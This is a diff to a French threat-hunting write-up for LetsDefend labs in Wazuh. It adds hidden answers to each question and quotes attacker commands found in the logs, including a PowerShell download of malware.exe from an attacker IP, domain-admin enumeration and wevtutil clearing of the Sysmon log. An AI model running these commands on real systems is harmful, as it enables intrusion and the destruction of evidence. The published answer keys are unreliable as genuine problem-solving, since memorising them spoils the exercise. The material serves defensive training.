@@ -7,7 +7,7 @@ up:
   - index.md
 ---
 
-Trois chasses guidées par une hypothèse, menées dans le SIEM Wazuh (onglet Discover, index `wazuh-alerts-*`, requêtes en DQL), question par question. Le lab 1 reprend mes captures ; les trois labs suivent le [writeup de Yusuf Arbaç](https://yusufarbc.dev/en/writeups/threat-hunting-with-edr-writeup-letsdefend/).
+Trois chasses guidées par une hypothèse, menées dans le SIEM Wazuh (onglet Discover, index `wazuh-alerts-*`, requêtes en DQL), question par question. Le lab 1 reprend mes captures ; les trois labs suivent le [writeup de Yusuf Talha Arabacı](https://yusufarbc.dev/en/writeups/threat-hunting-with-edr-writeup-letsdefend/).
 
 Environnement du Laboratoire de Chasse aux Menaces :
 
@@ -61,6 +61,13 @@ Point de départ : un mineur se trahit d'abord par la **charge CPU**. On part de
 
 ![Alerte Zabbix de CPU au-dessus du seuil dans Wazuh](../../../assets/threat-hunting-avec-l-edr-letsdefend-th-edr-lab1-01.png)
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+`app-server-01`
+
+</details>
+
 ### Question 2 — Le logiciel installé : Event ID 1033
 
 - Question 2 : What is the name of the application installed on the high-CPU system during Aug 1-7, 2024? Answer Format: Test Tester: Winrar & 7zip Extract Software
@@ -79,6 +86,13 @@ Journaux Windows → Application → 1033 (MsiInstaller) → Windows Installer i
 
 ![Trois événements 1033 MsiInstaller dans Wazuh](../../../assets/threat-hunting-avec-l-edr-letsdefend-th-edr-lab1-02.png)
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+`Cudo Miner: Bitcoin & Crypto Mining Software (Miner.exe)`
+
+</details>
+
 ### Question 3 — Le chemin de l'exécutable de minage : Sysmon 1
 
 - Question 3 : What is the full path of the mining executable? Answer Format: C:\\\\Temp\\\\LetsDefend\\\\Uploads\\\ ester.exe
@@ -88,6 +102,13 @@ Journaux Windows → Application → 1033 (MsiInstaller) → Windows Installer i
 - Deux machines remontent : garder celle de la question 1 ; l'autre resservira aux questions 8 à 10.
 
 ![Processus de minage trouvés par Sysmon 1 sur deux serveurs](../../../assets/threat-hunting-avec-l-edr-letsdefend-th-edr-lab1-03.png)
+
+<details markdown="1">
+<summary>Réponse</summary>
+
+`C:\Users\Admin\Downloads\miner.exe`
+
+</details>
 
 ### Question 4 — Le processus parent du mineur
 
@@ -99,21 +120,49 @@ Journaux Windows → Application → 1033 (MsiInstaller) → Windows Installer i
     - `w3wp.exe` (IIS) : l'application web a servi de porte d'entrée ;
     - `explorer.exe` : lancement par l'utilisateur (double-clic).
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+`C:\Windows\bitsadmin.exe`
+
+</details>
+
 ### Question 5 — Le domaine contacté par le mineur
 
 - Question : avec quel domaine le mineur a-t-il communiqué ?
 - Pivot sur l'exécutable : `data.win.eventdata.image: "<chemin complet trouvé à la question 3>"` (antislashs doublés dans la requête).
 - Parmi les résultats, l'événement **Sysmon 22** (requête DNS) donne le domaine dans `data.win.eventdata.queryName` ; un **Sysmon 3** donnerait l'IP et le port.
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+`account.cryptominer.io`
+
+</details>
+
 ### Question 6 — Le groupe derrière le domaine (CTI)
 
 - Question : à quel groupe de menace le Threat Intel de LetsDefend rattache-t-il ce domaine ?
 - Chercher le domaine dans le module Threat Intel : la fiche donne le **groupe**.
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+`RiverChildren`
+
+</details>
+
 ### Question 7 — Le hash partagé par le groupe (CTI)
 
 - Question : quel hash le Threat Intel associe-t-il à ce groupe ?
 - Chercher le nom du groupe dans Threat Intel : parmi ses IOCs, un **hash** (MD5 ici) devient le pivot suivant.
+
+<details markdown="1">
+<summary>Réponse</summary>
+
+`514CF877644F22924DA63989F3B56CD9`
+
+</details>
 
 ### Question 8 — Une autre machine porte le même hash
 
@@ -121,17 +170,38 @@ Journaux Windows → Application → 1033 (MsiInstaller) → Windows Installer i
 - Recherche libre `*<hash>*` sur toute la période, toutes machines ; colonne `agent.name`.
 - Un même hash sur une deuxième machine = **propagation** : l'incident n'est plus limité au poste de départ.
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+`app-server-02`
+
+</details>
+
 ### Question 9 — Le chemin du mineur sur cette machine
 
 - Question : quel est le chemin complet du mineur sur la deuxième machine ?
 - Même recherche ; lire `data.win.eventdata.image`.
 - Même binaire, **autre nom et autre dossier** (`C:\Windows\Temp\…`) : chercher par nom de fichier aurait manqué cette machine, la recherche par hash la trouve.
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+`C:\Windows\Temp\nanominer\nanominer.exe`
+
+</details>
+
 ### Question 10 — Le processus parent sur cette machine
 
 - Question : quel processus a lancé le mineur sur la deuxième machine ?
 - Même recherche ; lire `data.win.eventdata.parentImage`.
 - Le parent est cette fois le **processus de travail IIS** (`w3wp.exe`) : un serveur web qui lance un exécutable signe une exploitation de l'application web (web shell ou faille), une autre porte d'entrée que sur la première machine.
+
+<details markdown="1">
+<summary>Réponse</summary>
+
+`C:\Windows\w3wp.EXE`
+
+</details>
 
 ```text
 Q1 alerte CPU (Zabbix) → machine
@@ -153,6 +223,13 @@ Q1 alerte CPU (Zabbix) → machine
 - Filtre `rule.groups: sysmon_event1`, recherche `*powershell.exe*` ; affiner avec `data.win.eventdata.commandLine: *EncodedCommand*` (variantes : `-enc`, `-e`).
 - Lire `agent.ip` et `agent.name`.
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+*IP non publiée : la lire dans `agent.ip`*
+
+</details>
+
 ### Question 2 — La commande décodée
 
 - Question : que donne la commande une fois décodée ?
@@ -168,15 +245,36 @@ Q1 alerte CPU (Zabbix) → machine
 
 - La commande décodée est un `Invoke-WebRequest -Uri "http://<IP>/malware.exe" -OutFile "C:\Windows\Temp\malware.exe"` : téléchargement d'un exécutable depuis une IP (le serveur de l'attaquant), déposé dans `C:\Windows\Temp`.
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+`Invoke-WebRequest -Uri "http://<IP>/malware.exe" -OutFile "C:\Windows\Temp\malware.exe"` (IP du serveur non publiée)
+
+</details>
+
 ### Question 3 — Le groupe derrière l'IP (CTI)
 
 - Question : à quel groupe le Threat Intel rattache-t-il l'IP de téléchargement (C&C) ?
 - Chercher l'IP dans le module Threat Intel.
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+`APT-SKR-41`
+
+</details>
+
 ### Question 4 — Un hash du groupe (CTI)
 
 - Question : quel hash figure parmi les IOCs de ce groupe ?
 - Chercher le nom du groupe dans Threat Intel et relever le hash.
+
+<details markdown="1">
+<summary>Réponse</summary>
+
+`1230FB982C1A8DCBDF232BE450E124A34439D67`
+
+</details>
 
 ### Question 5 — Le processus parent du fichier
 
@@ -184,16 +282,37 @@ Q1 alerte CPU (Zabbix) → machine
 - Filtre `rule.groups: sysmon_event1`, recherche `*<hash>*` ; lire `data.win.eventdata.parentImage`.
 - Parent `explorer.exe` : le fichier a été lancé depuis la session de l'utilisateur (double-clic, raccourci).
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+`C:\Windows\explorer.exe`
+
+</details>
+
 ### Question 6 — L'IP contactée par le malware
 
 - Question : avec quelle IP le processus a-t-il communiqué ?
 - Filtre `rule.groups: sysmon_event3`, recherche `*malware.exe*` ; lire `data.win.eventdata.destinationIp` (et le port).
+
+<details markdown="1">
+<summary>Réponse</summary>
+
+*IP non publiée : la lire dans `data.win.eventdata.destinationIp`*
+
+</details>
 
 ### Question 7 — La réaction du pare-feu
 
 - Question : quelle action le pare-feu a-t-il appliquée à cette IP ?
 - Filtre `rule.groups: firewall and data.dstip: "<IP>"` ; lire l'action (`allow` / `deny`).
 - Ici la connexion est **bloquée** (`deny`) : cela ne clôt pas l'affaire, le malware s'est exécuté sur le poste, seule sa communication a échoué.
+
+<details markdown="1">
+<summary>Réponse</summary>
+
+`deny`
+
+</details>
 
 ```text
 Q1 Sysmon 1 : powershell -EncodedCommand → Q2 décodage → URL de téléchargement
@@ -214,15 +333,36 @@ Ici, Wazuh rattache déjà ses alertes à des techniques ATT&CK : on chasse par 
 - Question : sur quelle machine (`agent_ip`) a eu lieu l'activité T1087.001 (Local Account Discovery) ?
 - `rule.groups: windows and rule.mitre.id: T1087.001` ; lire `agent.ip`.
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+*IP non publiée : la lire dans `agent.ip`*
+
+</details>
+
 ### Question 2 — La commande de découverte des comptes locaux
 
 - Question : quelle commande a listé les comptes locaux ?
 - Même requête ; lire `data.win.eventdata.commandLine` : `net users`.
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+`net users`
+
+</details>
+
 ### Question 3 — Le groupe du domaine énuméré
 
 - Question : quel groupe du domaine a été énuméré ?
 - `rule.groups: windows and rule.mitre.id: T1087.002` (Domain Account Discovery) ; la ligne de commande est du type `net group "Domain Admins" /domain` : l'attaquant cherche les comptes à privilèges.
+
+<details markdown="1">
+<summary>Réponse</summary>
+
+`Domain Admins`
+
+</details>
 
 ### Question 4 — Le domaine dont on a listé les contrôleurs
 
@@ -230,11 +370,25 @@ Ici, Wazuh rattache déjà ses alertes à des techniques ATT&CK : on chasse par 
 - `rule.groups: windows and rule.mitre.id: T1018` (Remote System Discovery) ; la commande est `nltest /dclist:<domaine>`.
 - Recherche directe : `data.win.eventdata.commandLine: *nltest*`
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+`lab19.local`
+
+</details>
+
 ### Question 5 — L'exécutable utilisé (originalFileName)
 
 - Question : quel exécutable Windows (champ `originalFileName`) a servi à lister les contrôleurs de domaine ?
 - Même requête ; lire `data.win.eventdata.originalFileName` : **`nltestrk.exe`**.
 - C'est le nom interne de `nltest.exe`, inscrit dans le binaire à la compilation. Chercher sur `originalFileName` retrouve aussi une copie **renommée** de l'outil, que la recherche sur `image` manquerait.
+
+<details markdown="1">
+<summary>Réponse</summary>
+
+`nltestrk.exe`
+
+</details>
 
 ### Question 6 — La technique de découverte de l'IP de sortie
 
@@ -242,10 +396,24 @@ Ici, Wazuh rattache déjà ses alertes à des techniques ATT&CK : on chasse par 
 - `rule.groups: windows and rule.mitre.technique: Remote System Discovery` : la même technique remonte, avec aussi un **ping scan** du réseau.
 - Wazuh range cette activité sous **T1018** ; dans ATT&CK, la découverte de la connexion Internet est plutôt T1016.001 (Internet Connection Discovery).
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+`T1018`
+
+</details>
+
 ### Question 7 — L'URL qui donne l'IP de sortie
 
 - Question : quelle URL a servi à connaître l'IP publique de sortie ?
 - Même requête ; la commande interroge **`ifconfig.me`** (par ex. `curl ifconfig.me`), qui renvoie l'IP publique vue d'Internet.
+
+<details markdown="1">
+<summary>Réponse</summary>
+
+`ifconfig.me`
+
+</details>
 
 ### Question 8 — Le journal effacé
 
@@ -253,11 +421,25 @@ Ici, Wazuh rattache déjà ses alertes à des techniques ATT&CK : on chasse par 
 - `rule.groups: windows and rule.mitre.id: T1070.001` (Clear Windows Event Logs) : le journal de **Sysmon** (`Microsoft-Windows-Sysmon/Operational`), celui qui trace les processus.
 - Côté Windows, l'effacement d'un journal autre que Security laisse un **104** dans System (1102 pour Security).
 
+<details markdown="1">
+<summary>Réponse</summary>
+
+`Microsoft-Windows-Sysmon/Operational`
+
+</details>
+
 ### Question 9 — L'outil d'effacement
 
 - Question : quel exécutable (champ `originalFileName`) a effacé le journal ?
 - Même requête ; `originalFileName` : **`wevtutil.exe`**, commande `wevtutil cl Microsoft-Windows-Sysmon/Operational`.
 - Les événements déjà envoyés à Wazuh restent consultables : c'est tout l'intérêt de centraliser.
+
+<details markdown="1">
+<summary>Réponse</summary>
+
+`wevtutil.exe`
+
+</details>
 
 ```text
 Q1-Q2 T1087.001 net users → Q3 T1087.002 net group "Domain Admins" /domain
